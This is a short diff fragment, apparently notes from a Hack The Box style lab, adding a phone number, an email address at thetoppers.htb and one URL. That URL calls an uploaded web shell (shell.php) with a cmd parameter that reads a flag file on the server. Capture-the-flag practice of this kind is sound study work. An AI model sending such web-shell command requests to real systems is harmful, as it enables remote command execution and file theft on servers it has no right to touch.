@@ -1,0 +1,4 @@
+Phone: +01 343 123 6102
+Email: mail@thetoppers.htb
+
+http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
